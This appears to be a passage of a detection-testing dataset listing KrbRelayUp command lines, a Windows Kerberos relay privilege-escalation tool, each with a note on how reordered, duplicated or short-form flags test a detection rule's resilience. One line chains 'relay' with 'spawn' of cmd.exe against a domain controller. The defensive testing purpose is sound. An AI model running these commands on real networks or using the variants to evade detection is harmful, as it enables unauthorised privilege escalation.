explanation: This command represents a typical execution of KrbRelayUp with the 'relay' command and required flags. It is a baseline for testing detection.
Reordered arguments (-ComputerName flag moved after 'relay') to test if detection is order-dependent.
Added redundant '-d' flag with equivalent domain name to test detection resilience to argument duplication.
Inserted quotes around 'relay' command to test detection resilience to safe insertion techniques.
Duplicated '-Domain' flag to test detection resilience to redundant arguments.
Used short flags (-d, -cn, -cp) instead of long flags to test detection resilience to substitution techniques.

output: KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 relay -Domain contoso.com -ComputerName DC01
explanation: Duplicated both '-Domain' and '-ComputerName' flags to test detection resilience to redundant arguments.

output: KrbRelayUp.exe -Domain contoso.com -ComputerName DC01 "relay" -d contoso.com -cn DC01 spawn -cp C:\\Windows\\System32\\cmd.exe
explanation: Combined reordering, substitution, and insertion techniques to test detection resilience to multiple safe mutation techniques.
